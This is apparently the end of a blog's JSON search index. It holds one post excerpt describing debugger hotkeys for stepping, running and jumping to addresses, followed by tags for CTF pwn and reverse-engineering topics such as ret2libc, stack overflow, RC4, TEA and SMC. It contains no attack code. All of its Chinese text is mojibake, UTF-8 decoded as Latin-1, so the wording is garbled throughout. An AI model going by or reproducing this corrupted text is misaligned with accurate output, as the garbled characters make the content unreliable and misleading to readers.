‡å¤„F7ï¼šå•æ­¥æ­¥å…¥ã€‚ï¼ˆé‡åˆ°callæŒ‡ä»¤ï¼Œè¿›å…¥callå‡½æ•°çš„å®ç°å¤„ç»§ç»­æ‰§è¡Œæ±‡ç¼–æŒ‡ä»¤ï¼‰F8ï¼šå•æ­¥æ­¥è¿‡ã€‚ï¼ˆé‡åˆ°callæŒ‡ä»¤ï¼Œæ‰§è¡Œcallå‡½æ•°ï¼Œä¹‹åæ¥ç€æ‰§è¡ŒcallæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼‰F9ï¼šè¿è¡Œç¨‹åºï¼ˆå¦‚æœæ²¡æœ‰ç¢°åˆ°æ–­ç‚¹ï¼Œç¨‹åºä¼šä¸€ç›´æ‰§è¡Œåˆ°ç»“æŸã€‚ï¼‰ Ctrl+F9: æ‰§è¡Œåˆ°å‡½æ•°è¿”å›å¤„ï¼Œç”¨äºè·³å‡ºå‡½æ•°å®ç° Alt+F9:æ‰§è¡Œåˆ°ç”¨æˆ·ä»£ç ï¼Œç”¨äºå¿«é€Ÿè·³å‡ºç³»ç»Ÿå‡½æ•° Ctrl+G:è¾“å…¥åå…­è¿›åˆ¶åœ°å€ï¼Œå¿«é€Ÿå®šä½åˆ°è¯¥åœ°å€å¤„","categories":[],"tags":[{"name":"åŠ¨è°ƒ","slug":"åŠ¨è°ƒ","permalink":"http://example.com/tags/%E5%8A%A8%E8%B0%83/"}]}],"categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"},{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"ret2libc_printf","slug":"ret2libc-printf","permalink":"http://example.com/tags/ret2libc-printf/"},{"name":"printf","slug":"printf","permalink":"http://example.com/tags/printf/"},{"name":"æ ˆæº¢å‡º","slug":"æ ˆæº¢å‡º","permalink":"http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"},{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"çŒœæ•°","slug":"çŒœæ•°","permalink":"http://example.com/tags/%E7%8C%9C%E6%95%B0/"},{"name":"NSS","slug":"NSS","permalink":"http://example.com/tags/NSS/"},{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"},{"name":"èŠ±æŒ‡ä»¤","slug":"èŠ±æŒ‡ä»¤","permalink":"http://example.com/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"name":"RC4å˜å¼","slug":"RC4å˜å¼","permalink":"http://example.com/tags/RC4%E5%8F%98%E5%BC%8F/"},{"name":"TEA","slug":"TEA","permalink":"http://example.com/tags/TEA/"},{"name":"SMC","slug":"SMC","permalink":"http://example.com/tags/SMC/"},{"name":"RC4","slug":"RC4","permalink":"http://example.com/tags/RC4/"},{"name":"åŠ¨è°ƒ","slug":"åŠ¨è°ƒ","permalink":"http://example.com/tags/%E5%8A%A8%E8%B0%83/"}]}